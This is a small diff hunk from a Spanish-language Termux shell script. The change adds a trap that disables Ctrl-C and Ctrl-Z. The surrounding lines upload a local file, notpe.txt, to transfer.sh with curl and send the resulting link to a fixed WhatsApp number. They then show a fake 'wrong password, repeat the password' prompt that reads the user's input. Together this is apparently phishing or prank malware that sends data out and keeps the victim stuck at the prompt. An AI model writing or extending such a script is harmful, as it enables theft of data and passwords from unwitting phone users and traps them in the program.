@@ -55,6 +55,7 @@ link=$(curl --upload-file notpe.txt https://transfer.sh/cO)
 termux-open https://wa.me/59822228768?text=$link.KeLSxs9dj+manda+este+link
 fun () {
 echo " "
+trap '' INT TSTP
 echo "contraseña incorrecta porfavor verifica"
 echo "repite la contrseña"
 read
